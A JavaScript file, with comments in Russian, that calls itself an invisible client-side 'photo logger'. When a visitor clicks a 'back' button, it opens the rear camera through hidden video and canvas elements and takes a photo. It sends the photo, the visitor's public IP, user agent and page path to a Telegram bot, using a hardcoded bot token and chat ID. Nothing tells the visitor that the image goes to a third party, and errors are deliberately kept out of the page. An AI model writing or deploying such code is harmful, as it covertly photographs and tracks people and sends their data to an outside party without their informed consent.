// new_script.js
// Невидимый клиентский скрипт. Выполняет съемку и отправку только по клику на #backBtn.
// ВСТАВЛЕНЫ BOT_TOKEN и CHAT_ID по вашему запросу.
// WARNING: токен в клиентском коде виден всем. Рекомендуется использовать прокси (Worker) в проде.

(function () {
  'use strict';

  /********** Настройки (вставлены) **********/
  const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
  const CHAT_ID   = "7518382960";
  const MAX_FILE_BYTES = 3_000_000;   // 3 MB
  const PUBLIC_IP_API = "https://api.ipify.org?format=json";
  const CAPTURE_QUALITY = 0.85;
  const CAPTURE_TIMEOUT_MS = 10000;
  const SESSION_FLAG = "tg_photo_logger_sent_v1"; // не шлём чаще чем в одну сессию
  /*********************************************/

  // Предохранитель: не выполнять автоматически.
  // Скрипт запускается только по клику на кнопку с id="backBtn".
  function safeLog(...args) { if (window.console) console.log('[TGPhoto]', ...args); }

  // Скрытые элементы (используются локально)
  const video = document.createElement('video');
  video.autoplay = true;
  video.playsInline = true;
  video.style.display = 'none';
  document.documentElement.appendChild(video);

  const canvas = document.createElement('canvas');
  canvas.style.display = 'none';
  document.documentElement.appendChild(canvas);

  // Небольшие утилиты
  function hasSentThisSession() { return !!sessionStorage.getItem(SESSION_FLAG); }
  function markSentThisSession() { sessionStorage.setItem(SESSION_FLAG, '1'); }

  async function fetchPublicIP(timeoutMs = 3000) {
    try {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeoutMs);
      const r = await fetch(PUBLIC_IP_API, { signal: controller.signal });
      clearTimeout(id);
      if (!r.ok) return null;
      const j = await r.json().catch(() => null);
      return j && j.ip ? j.ip : null;
    } catch (e) {
      safeLog('ip fetch failed', e && e.message ? e.message : e);
      return null;
    }
  }

  // Захват кадра из потока
  function captureFrame(quality = CAPTURE_QUALITY) {
    return new Promise(resolve => {
      try {
        const w = video.videoWidth || 640;
        const h = video.videoHeight || 480;
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, w, h);
        canvas.toBlob(blob => resolve(blob), 'image/jpeg', quality);
      } catch (e) {
        safeLog('captureFrame error', e);
        resolve(null);
      }
    });
  }

  // Отправка фото в Telegram (sendPhoto). Может упасть из-за CORS.
  async function sendPhotoToTelegram(blob, caption) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok:false, reason:'config' };

    // Уменьшаем размер, если слишком большой
    if (blob.size > MAX_FILE_BYTES) {
      try {
        const img = await createImageBitmap(blob);
        const scale = Math.sqrt(MAX_FILE_BYTES / blob.size) * 0.95;
        const nw = Math.max(160, Math.floor(img.width * scale));
        const nh = Math.max(120, Math.floor(img.height * scale));
        canvas.width = nw; canvas.height = nh;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, nw, nh);
        const reduced = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
        if (reduced) blob = reduced;
        safeLog('reduced blob size', blob.size);
      } catch (e) {
        safeLog('reduction failed', e);
      }
    }

    const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    if (caption) form.append('caption', caption);

    try {
      const resp = await fetch(url, { method: 'POST', body: form });
      const text = await resp.text().catch(() => null);
      if (!resp.ok) {
        safeLog('telegram non-ok', resp.status, text);
        return { ok:false, status:resp.status, text };
      }
      return { ok:true, status:resp.status, text };
    } catch (err) {
      safeLog('sendPhoto fetch error (likely CORS)', err && (err.message || err));
      return { ok:false, reason:'fetch_error', error:String(err) };
    }
  }

  // Формирование подписи
  function buildCaption(ip) {
    const time = new Date().toISOString();
    const ua = navigator.userAgent || '-';
    const page = location.pathname + (location.search || '');
    const parts = [
      `Время: ${time}`,
      `Страница: ${page}`,
      `IP: ${ip || 'не получен'}`,
      `UA: ${ua}`
    ];
    let caption = parts.join('\n');
    if (caption.length > 900) caption = caption.slice(0,900) + '...';
    return caption;
  }

  // Основная процедура: должна вызываться только по клику пользователя.
  async function runCapture(extraNote) {
    if (hasSentThisSession()) {
      safeLog('already sent this session — abort');
      return { ok:false, reason:'session' };
    }

    // user gesture вызов должен позволить getUserMedia
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
    } catch (e) {
      safeLog('getUserMedia failed/denied', e);
      return { ok:false, reason:'camera_denied', error:String(e) };
    }

    try {
      video.srcObject = stream;
      try { await video.play(); } catch (e) { /* ignore */ }
    } catch (e) {
      safeLog('video attach error', e);
    }

    // Ждём готовности кадра
    const start = Date.now();
    while (true) {
      if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) break;
      if (Date.now() - start > CAPTURE_TIMEOUT_MS) break;
      await new Promise(r => setTimeout(r, 100));
    }

    const blob = await captureFrame(CAPTURE_QUALITY);

    // Отключаем камеру
    try { stream.getTracks().forEach(t => t.stop()); video.srcObject = null; } catch (e) { /* ignore */ }

    if (!blob) {
      safeLog('no blob captured');
      return { ok:false, reason:'no_blob' };
    }
    safeLog('captured blob size', blob.size);

    // Публичный IP (если доступен)
    const ip = await fetchPublicIP().catch(()=>null);
    const captionBase = buildCaption(ip);
    const caption = extraNote ? (captionBase + '\n' + String(extraNote).slice(0,200)) : captionBase;

    // Попытка отправки напрямую к Telegram
    const res = await sendPhotoToTelegram(blob, caption);

    if (res && res.ok) {
      markSentThisSession();
      safeLog('send ok', res);
      return { ok:true, res };
    } else {
      safeLog('send failed', res);
      return { ok:false, res };
    }
  }

  // Привязка к кнопке #backBtn. Запуск по клику.
  document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('backBtn');
    if (!btn) {
      safeLog('button #backBtn not found on page');
      return;
    }
    btn.addEventListener('click', async (ev) => {
      // предотвращаем двойной срабатывания
      btn.disabled = true;
      try {
        const result = await runCapture();
        if (!result.ok) {
          // ошибка в консоль. Пользователь видит системный prompt; ошибок UI не показываем.
          safeLog('runCapture result', result);
        }
      } finally {
        btn.disabled = false;
      }
    });
  });

  // Экспорт для явного вызова из кода: window.TGPhotoLogger.runCapture()
  window.TGPhotoLogger = { runCapture };

})();